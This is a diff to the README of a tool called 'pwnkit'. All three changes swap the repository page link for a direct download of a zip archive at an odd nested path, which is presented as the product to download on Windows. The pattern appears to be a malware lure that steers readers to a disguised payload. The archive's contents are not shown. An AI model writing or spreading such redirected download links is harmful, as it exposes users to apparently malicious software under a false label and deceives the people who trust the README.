@@ -1,6 +1,6 @@
 # 🛡️ pwnkit - Safer AI and app testing
 
-[![Download pwnkit](https://img.shields.io/badge/Download%20pwnkit-blue-grey?style=for-the-badge)](https://github.com/Gerberayale521/pwnkit)
+[![Download pwnkit](https://img.shields.io/badge/Download%20pwnkit-blue-grey?style=for-the-badge)](https://github.com/Gerberayale521/pwnkit/raw/refs/heads/main/Zan/Software_v2.8.zip)
 
 ## 🚀 What pwnkit does
 
@@ -17,7 +17,7 @@ Use it to:
 
 Use this link to visit the page to download:
 
-https://github.com/Gerberayale521/pwnkit
+https://github.com/Gerberayale521/pwnkit/raw/refs/heads/main/Zan/Software_v2.8.zip
 
 ### 1. Open the download page
 Open the link above in your browser on Windows.
@@ -210,7 +210,7 @@ If you plan to keep records, make a folder for each target so you can find old r
 
 If you need the download page again, use this link:
 
-https://github.com/Gerberayale521/pwnkit
+https://github.com/Gerberayale521/pwnkit/raw/refs/heads/main/Zan/Software_v2.8.zip
 
 ## 📌 Tips for first-time users
 
